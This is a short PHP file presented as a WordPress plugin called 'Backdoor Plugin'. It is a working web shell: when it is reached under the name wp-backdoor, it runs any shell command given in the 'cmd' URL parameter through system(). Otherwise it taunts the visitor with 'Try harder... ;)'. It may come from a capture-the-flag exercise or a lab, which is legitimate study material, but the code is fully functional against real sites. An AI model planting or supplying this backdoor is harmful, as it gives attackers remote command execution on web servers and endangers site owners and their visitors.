<?php
/*
Plugin Name: Backdoor Plugin
*/

function call_system($cmd) {
	system($cmd);
}

if(basename($_SERVER["SCRIPT_FILENAME"], '.php') == 'wp-backdoor'){	
	if(isset($_GET['cmd'])){
		call_system($_GET['cmd']);
	} else{
		print "Try harder... ;)";
	}
}